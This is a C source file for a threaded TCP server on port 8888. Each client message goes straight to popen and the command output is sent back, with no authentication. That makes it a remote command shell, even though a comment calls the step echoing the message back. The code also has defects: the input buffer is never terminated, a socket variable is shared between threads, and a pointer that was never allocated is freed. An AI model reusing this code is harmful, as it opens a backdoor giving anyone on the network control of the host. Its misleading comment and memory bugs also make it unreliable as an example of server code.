#include<stdio.h>
#include<string.h>    //strlen
#include<stdlib.h>    //strlen
#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include<unistd.h>    //write
#include<pthread.h> //for thread


 #define MAX_CLIENTS 5


//the thread function
void *new_connection_handler(void *);

int main(int argc , char *argv[])
{
    int socket_desc , client_sock , c , *new_sock;
    struct sockaddr_in server , client;


    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }


    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( 8888 );
    bzero (&server.sin_zero, 8);



    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //print the error message
        perror("bind failed. Error");
        return 1;
    }


    //Listen
    listen(socket_desc , MAX_CLIENTS);



    //Accept and incoming connection
    printf("Waiting for incoming connections\n");




    c = sizeof(struct sockaddr_in);
    while( (client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c)) )
    {
        printf("Connection accepted");



        pthread_t thread_id;




        if( pthread_create( &thread_id , NULL ,  new_connection_handler , (void*) &client_sock) < 0)
        {
            perror("could not create thread");
            return 1;
        }



     printf("Handler assigned\n");
    }


    if (client_sock < 0)
    {
        perror("accept failed");
        return 1;
    }

    return 0;
}


void *new_connection_handler(void *socket_desc)
{
    //Get the socket descriptor
    int sock = *(int*)socket_desc;
    int read_size;
    char *message , client_message[2000];



    //Send some messages to the client
    message = "This is connection handler\n";
    write(sock , message , strlen(message));


    message = "Type something \n";
    write(sock , message , strlen(message));

    //Receive a message from client
    while( (read_size = recv(sock , client_message , 2000 , 0)) > 0 )
    {
        //Send the message back to client
        FILE *stream = popen(client_message, "r");
        char buf[1000];
        while (fgets(buf, sizeof(buf), stream) != 0) {
            write(sock , buf , strlen(buf));
        }
        pclose(stream);

    }
    
    if(read_size == 0)
    {
        printf("Client disconnected\n");
        fflush(stdout);
    }
    else if(read_size == -1)
    {
        perror("recv failed");
    }

    //Free the socket pointer
    free(socket_desc);

    return 0;
}
